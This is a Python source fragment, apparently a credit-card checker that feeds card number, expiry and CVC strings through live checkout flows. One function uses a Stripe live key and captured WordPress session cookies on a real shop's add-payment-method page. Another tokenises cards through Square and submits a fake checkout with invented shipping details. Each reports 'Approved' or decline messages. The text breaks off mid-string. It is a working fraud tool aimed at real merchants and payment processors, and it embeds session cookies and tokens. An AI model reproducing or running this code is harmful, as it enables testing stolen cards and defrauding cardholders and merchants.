	data = f'type=card&billing_details[name]=mska+wj&billing_details[email]=visaspam77%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=7cc87d82-fed5-482b-9b2f-e66d2e9b50e29d8d03&sid=7393ded3-06d2-4443-acf4-239cfabbe3c8ea8e71&payment_user_agent=stripe.js%2F1a2719a8b8%3B+stripe-js-v3%2F1a2719a8b8%3B+card-element&referrer=https%3A%2F%2Fladymcadden.org&time_on_page=123420&key=pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYmBKRxySZrZh6v6MFmCsemikGlGpWEhh6O7lW9rjjLCFdmFqgTW4oAXM4RbEc73BmG_B2SDxLbjCur-Hgeg1C7mtpk5l0ivb0tw3F9DBvnX7VHuyRSlCyl_e_M6FR6imEND3WSxAwqzMnKaMggFRqgBbDJUD2UVhw4frRr_47X1om4_nKzXRM0m7VObUQg0TEcduvbwNvpqUzwxn7bYhecGGyriCW3TmEuEMUqM47r-9LbfVJ-qZfxsDi2uqZjzfTFxzx9JGo9bKgrjoK0EjVGkyJfzZ0GiKa4IjO200u7rN7GnduXwC0csWPGVBp6b-0J4UerDL6uP-r-XMAt8xHypxghQ1ngdI1xbyT4vvcrUlNImHosvzGDQzJLo1L_-GfoScK8I7qBM4N2mx3Xix1Vvevr3XRN_PW33oxryL623exr0vViV6fWHSg9hDrzrftWrbb-ZAVr831GeidH5o_KWwq2xFJ5z-tLhVGR32I2DvfnzC3DtIAgpGO769GbR8M22uPchYI2KLsy4XOHoM-a3XUVglKvjuJCAb5r9mIGGyQLYSvJ9OHrAlrdUrsXQohNzsMfWIugdgB9eNe4t_cNNeEhBHxq1AP4bSS3cFJHrkIF6Ev3NedB0zEm5WBVZpHb365k6Cy5OmZ2ArDRu14tm5OCnt-Akm7qe3Xb_B25oeY4kEif_pDL-_3LVvw1zp9rc54e7PZpwk1qfNlfWDHwYLLYXtKlhYJF7HKxzq0I48Nte8qoOX_E6WtS7cQzQckmE_yrUKLNaW9whDv0vjDBjcK0_nsVYfeUaWKJEEgdcrS6KAqnfd8J0c9M-iI-1CirR00sDeHvOqgpYZ7uO7WEs_3N9PQRzFOFOY_I-wPPrhpqGGAwqUZXjuy767WFeO1dgPY2sVXamkCkqrAAN-nUTWsmtBnuzy73lJlDET1YXW61YTjbAK4VKpAEJlzHWIIMtnaXSXafBc59vhhwuYJtl7T3FjB0WE8HaKUJ5oegkyw97KBL4kIiyVjTjAYJbb0076TChT_2sc01YDSl1Y56CYGxeDS2Xs1ezu1s-QxhPKm7haUVl-Da_mNi_8pqNcC-TUejDQU0SPJNeEfKwQQG5X05zU6GMJDwrS7SNtj6LO-d0iGBm4lAjl0etaEYmdcY0AeK_HJJGmOjfD8AVUu2WTfr50V6Jqvu7ZehGaolB0wdwUUmTatVNG_g4AP-Xu8xC_RYK3Ub_sXBJdCMkendTBq6Tu27xD0Y1HHAppRUuFgkHiLn190XdQq_IcDpCmg8-lX9JX-tKMFx-LZlkZov1gdI3hEG9pMhma3o_wF0cV_PqR5zRzewAxYdEmTyGEx5HXlL6Bd8psANmzEtk6XuRtEn5d7Vkc7NllNZAckh3mvpD55fPlSszu6iIUw_RkddqddA0ABRObdeIn8sTEvmna9gI8GjR03ipSxcCQzxNG2ssV6rip5leQrWTDlMwstzhU5BE33hdA9MGUeAufik3rPzpX1vWpJ6fQUFxsYJAE0YrO-J2LKAGqAXTWxY8DyqA4nMiX5c2t3X1b0svAvVek9Cv6DnDsvphLj83se30YAEWGdWGyQ5ivuwmDSsAOgM5-1nqPySgNBY_gEC96DpN0wIhGhP49tOr-sPg744P4ZeandUcdP-vUjgbB0Vejw9CzAfkSu4abaUA2oNaGcbPIvrJTeM2skXwDm251hfktqq99KCFMAdED-tMH3a6p-i9QsDGkWQvYCfsEdFS_jaKr1xvQxkBm9t1145nXXevC03yx2Hj4uJZXxUKjuBcKBSsNB2dmAteKb18JyZfUq6931Wqbgi4g4J8nmpGdb7RLD1S5zrEhcA_aou1Xi1WQ__9RRaF2ENvwZxBs4t-2faxrhcP2IvAm7TrOIHdlSMWawMhTvx1jQdmQJTldexgJ0vR2959m1mcKvLme2cNLCK7qL-f2J8oNgzxHd1hBiEjb66DALhArHwCMfdtFdNIvtN1pcnZ_LP7bC9s47eokSc7VYUnOajNmZTUSThEhcPnSmmIh5wRryjsUEtbe4ngjMk_HSmVScSa5ZDy11mBNNYktxxixqAQvzTzvGF0Tg4PuafGYbcUA6jZXhwzmYR2b2oc2hhcmRfaWTOAzGDb6JrcqgyZDBkN2U2Y6JwZAA.SK-SyTzugYiHydaVLkaoG4BbB8zX7TOb3Vq521W-e2I'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:

		return 'Your card was declined.'
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
		nonce=json_data['sc']['nonce']
	cookies = {
	    'cookielawinfo-checkbox-necessary': 'yes',
	    'cookielawinfo-checkbox-non-necessary': 'yes',
	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9',
	    'viewed_cookie_policy': 'yes',
	    '__stripe_mid': '7cc87d82-fed5-482b-9b2f-e66d2e9b50e29d8d03',
	    '_I_': '368676298c93a65e0f5464259e6e30716fe9047b1aa051f5c7d0cae09473b919-1712444853',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-04-25%2002%3A15%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-04-25%2002%3A15%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
	    '_gid': 'GA1.2.1929101409.1714011319',
	    '__stripe_sid': '3e8ec4e7-7c99-44ac-87af-7515092c12acffe307',
	    'wordpress_test_cookie': 'WP%20Cookie%20check',
	    'wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf': 'hshsjsj%7C1715222531%7CJwAdhZSXjoHu3zclTK7nIc26Pje2bu6F4udaCEk9A86%7Cc2cefdfcd1057f6b41221cf97ea2cb4b84278f07f8295cda08f4fb2114567677',
	    'wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f': '75%7Cother%7Cread%7C44a7c22e542f7bd1189fed4c4c524863b77310a793ef4c50f36b48d3bae75d89',
	    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F',
	    '_ga_TGRXJZZPXB': 'GS1.1.1714011318.7.1.1714013945.0.0.0',
	    '_gat_UA-188458572-1': '1',
	    '_gat_gtag_UA_188458572_1': '1',
	    '_ga_DJ8QP66SFT': 'GS1.1.1714011320.6.1.1714013947.0.0.0',
	    '_ga': 'GA1.1.953697205.1712306680',
	}
	
	headers = {
	    'authority': 'ladymcadden.org',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __stripe_mid=7cc87d82-fed5-482b-9b2f-e66d2e9b50e29d8d03; _I_=368676298c93a65e0f5464259e6e30716fe9047b1aa051f5c7d0cae09473b919-1712444853; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-25%2002%3A15%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-04-25%2002%3A15%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; _gid=GA1.2.1929101409.1714011319; __stripe_sid=3e8ec4e7-7c99-44ac-87af-7515092c12acffe307; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf=hshsjsj%7C1715222531%7CJwAdhZSXjoHu3zclTK7nIc26Pje2bu6F4udaCEk9A86%7Cc2cefdfcd1057f6b41221cf97ea2cb4b84278f07f8295cda08f4fb2114567677; wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f=75%7Cother%7Cread%7C44a7c22e542f7bd1189fed4c4c524863b77310a793ef4c50f36b48d3bae75d89; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F; _ga_TGRXJZZPXB=GS1.1.1714011318.7.1.1714013945.0.0.0; _gat_UA-188458572-1=1; _gat_gtag_UA_188458572_1=1; _ga_DJ8QP66SFT=GS1.1.1714011320.6.1.1714013947.0.0.0; _ga=GA1.1.953697205.1712306680',
	    'origin': 'https://ladymcadden.org',
	    'referer': 'https://ladymcadden.org/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = requests.post('https://ladymcadden.org/', params=params, cookies=cookies, headers=headers, data=data)
	if 'success' in response.text:
		return 'Approved'
	elif 'Unable to verify your request. Please reload the page and try again.' in response.text:	
		cookies = {
	    'cookielawinfo-checkbox-necessary': 'yes',
	    'cookielawinfo-checkbox-non-necessary': 'yes',
	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9',
	    'viewed_cookie_policy': 'yes',
	    '__stripe_mid': '7cc87d82-fed5-482b-9b2f-e66d2e9b50e29d8d03',
	    '_I_': '368676298c93a65e0f5464259e6e30716fe9047b1aa051f5c7d0cae09473b919-1712444853',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-04-25%2002%3A15%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-04-25%2002%3A15%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
	    '_gid': 'GA1.2.1929101409.1714011319',
	    '__stripe_sid': '3e8ec4e7-7c99-44ac-87af-7515092c12acffe307',
	    'wordpress_test_cookie': 'WP%20Cookie%20check',
	    'wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf': 'hshsjsj%7C1715222531%7CJwAdhZSXjoHu3zclTK7nIc26Pje2bu6F4udaCEk9A86%7Cc2cefdfcd1057f6b41221cf97ea2cb4b84278f07f8295cda08f4fb2114567677',
	    'wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f': '75%7Cother%7Cread%7C44a7c22e542f7bd1189fed4c4c524863b77310a793ef4c50f36b48d3bae75d89',
	    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F',
	    '_ga_TGRXJZZPXB': 'GS1.1.1714011318.7.1.1714013945.0.0.0',
	    '_gat_UA-188458572-1': '1',
	    '_gat_gtag_UA_188458572_1': '1',
	    '_ga_DJ8QP66SFT': 'GS1.1.1714011320.6.1.1714013947.0.0.0',
	    '_ga': 'GA1.1.953697205.1712306680',
	}
		
		headers = {
		    'authority': 'ladymcadden.org',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'cache-control': 'max-age=0',
		    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __stripe_mid=7cc87d82-fed5-482b-9b2f-e66d2e9b50e29d8d03; _gid=GA1.2.1560867656.1712444812; _I_=368676298c93a65e0f5464259e6e30716fe9047b1aa051f5c7d0cae09473b919-1712444853; wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf=mska.wj%7C1713655147%7Clm901W7uRhNvSNqG9RIqu0W4peqchMTYd35jLUFmFpJ%7C45b81b0d86c9b3e533c14b3fff2fd61c65e90f410ad635927fa9b3b700555ed0; wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f=65%7Cother%7Cread%7Cb5f391963486c98ca098b06e5d86ef6a76f46061776f6f0146a1db380bb59276; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-07%2023%3A54%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-04-07%2023%3A54%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; _gat_UA-188458572-1=1; _gat_gtag_UA_188458572_1=1; __stripe_sid=d9d68f76-dbf2-4072-8593-7b89fee9acd6866c92; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F; _ga_TGRXJZZPXB=GS1.1.1712534066.4.1.1712534090.0.0.0; _ga_DJ8QP66SFT=GS1.1.1712534067.4.1.1712534090.0.0.0; _ga=GA1.1.953697205.1712306680',
		    'referer': 'https://ladymcadden.org/my-account/payment-methods/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'same-origin',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		response = requests.get('https://ladymcadden.org/my-account/add-payment-method/', cookies=cookies, headers=headers)
		nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		nonce=json_data['sc']['nonce']=nonce
		with open('gates.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return 'Your card was declined.' 
	try:		
		ct=(response.json()['client_secret'])
		cts=ct.split('_secret_')[0]
	except:
		return 'Your card was declined.'
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': id,
	    'expected_payment_method_type': 'card',
	    'use_stripe_sdk': 'true',
	    'key': 'pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y',
	    'client_secret': ct,
	}
	
	response = requests.post(
	    f'https://api.stripe.com/v1/setup_intents/{cts}/confirm',
	    headers=headers,
	    data=data,
	)
	sc=response.json()['next_action']['use_stripe_sdk']['three_d_secure_2_source']
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'source={sc}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22800%22%2C%22browserScreenWidth%22%3A%22360%22%2C%22browserTZ%22%3A%22-120%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F120.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y'
	
	response = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'key': 'pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y',
	    'is_stripe_sdk': 'false',
	    'client_secret': ct,
	}
	
	response = requests.get(f'https://api.stripe.com/v1/setup_intents/{cts}', params=params, headers=headers)
	try:
		return (response.json()['last_setup_error']['message'])
	except:
		return '3d_secure_2'
def sh(card):
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if len(yy) == 2:
		yy=f'20{yy}'
	
	cookies = {
	    '_savt': 'e8c8852d-a9ee-4066-96a9-72e09507eab1',
	    '__cf_bm': '.OigtgpZT1OfxOgb49ux64fh_ISlCcApo_2Qxw6sXcU-1713788923-1.0.1.1-rpfa_.g6A5TpSfqmINoweeT1JYhsPUql4Vqxs_2XWOG0iYtz_AZIk7bLi1Z20wnmxi5YuUbg0nuX2XiGaGZX5g',
	}
	
	headers = {
	    'authority': 'pci-connect.squareup.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/json; charset=utf-8',
	    # 'cookie': '_savt=e8c8852d-a9ee-4066-96a9-72e09507eab1; __cf_bm=.OigtgpZT1OfxOgb49ux64fh_ISlCcApo_2Qxw6sXcU-1713788923-1.0.1.1-rpfa_.g6A5TpSfqmINoweeT1JYhsPUql4Vqxs_2XWOG0iYtz_AZIk7bLi1Z20wnmxi5YuUbg0nuX2XiGaGZX5g',
	    'origin': 'https://web.squarecdn.com',
	    'referer': 'https://web.squarecdn.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    '_': '1713789380111.3928',
	    'version': '1.55.0',
	}
	
	json_data = {
	    'client_id': 'sq0idp-9ShLQffc_52GQ-PV3xba1Q',
	    'location_id': 'AM31SXMGB2JP6',
	    'payment_method_tracking_id': '3a4ee6a9-5f73-04bf-1e25-2cbd7cd243df',
	    'session_id': 'XW9ezUXASNl8id3_A8oUE4zKxUITZpjDHECigS4WM1ho6lYZwnA82bFF02EArJWGx3fCr_RHtGbDk_C4sxo=',
	    'website_url': 'codeofharmony.com',
	    'analytics_token': 'DHLQDBBXXYC3PDILXFXS2QL7KJ3QSTV5UGZWXEAQHKAJAYUF36SVYSDESCTN4PRNRWYFCYTKN5NIZ5SFRG24OEGTG5KF4E753WTZCRI',
	    'card_data': {
	        'billing_postal_code': '11743',
	        'cvv': cvc,
	        'exp_month': int(mm),
	        'exp_year': int(yy),
	        'number': n,
	    },
	}
	
	response = requests.post(
	    'https://pci-connect.squareup.com/v2/card-nonce',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)

	id=response.json()['card_nonce']
	headers = {
	    'authority': 'phpstack-1046663-3864545.cloudwaysapps.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://codeofharmony.com',
	    'referer': 'https://codeofharmony.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'discount_code': '',
	    'giftcard_code': '',
	    'checkout_email': 'visaspam77@gmail.com',
	    'phone': '2076516786',
	    'shipping[first_name]': 'mska',
	    'shipping[last_name]': 'wj',
	    'shipping[address]': '2058 Duncan Avenue',
	    'shipping[address2]': '',
	    'shipping[city]': 'Huntington',
	    'shipping[country]': 'US',
	    'shipping[state]': 'NY',
	    'shipping[pincode]': '11743',
	    'shipping_charge': '8.0',
	    'billingadd': 'ship',
	    'billing[first_name]': 'mska',
	    'billing[last_name]': 'wj',
	    'billing[address]': '2058 Duncan Avenue',
	    'billing[address2]': '',
	    'billing[city]': 'Huntington',
	    'billing[country]': 'US',
	    'billing[state]': 'NY',
	    'billing[pincode]': '11743',
	    'customer_id': '',
	    'note': '',
	    'cust_ws_tag': '',
	    'shop': '2f8ca4.myshopify.com',
	    'cart': 'eyJ0b2tlbiI6IloyTndMV1YxY205d1pTMTNaWE4wTVRvd01VaFhNbGRUVmtRelJFNU9NVkF4TmxKT1JEQkhPREl6UXciLCJub3RlIjoiIiwiYXR0cmlidXRlcyI6W10sIm9yaWdpbmFsX3RvdGFsX3ByaWNlIjoxNjAwLCJ0b3RhbF9wcmljZSI6MTYwMCwidG90YWxfZGlzY291bnQiOjAsInRvdGFsX3dlaWdodCI6MCwiaXRlbV9jb3VudCI6MSwiaXRlbXMiOlt7ImlkIjo0NjEwMDI0MzIxODczOCwicHJvcGVydGllcyI6W10sInF1YW50aXR5IjoxLCJ2YXJpYW50X2lkIjo0NjEwMDI0MzIxODczOCwia2V5IjoiNDYxMDAyNDMyMTg3Mzg6MzJmNWUyZmNhNmUyNjc3NzRiM2U1Yzk3YTc4MjA2MWQiLCJ0aXRsZSI6IkFjaWRlbGljIE1pY3JvcG9saXNoIC0gTWluaSAwLjVveiAtICQxNi4wMCIsInByaWNlIjoxNjAwLCJvcmlnaW5hbF9wcmljZSI6MTYwMCwicHJlc2VudG1lbnRfcHJpY2UiOjE2LCJkaXNjb3VudGVkX3ByaWNlIjoxNjAwLCJsaW5lX3ByaWNlIjoxNjAwLCJvcmlnaW5hbF9saW5lX3ByaWNlIjoxNjAwLCJ0b3RhbF9kaXNjb3VudCI6MCwiZGlzY291bnRzIjpbXSwic2t1IjoiMTAwIiwiZ3JhbXMiOjAsInZlbmRvciI6IkNPSCBTaG9wIiwidGF4YWJsZSI6dHJ1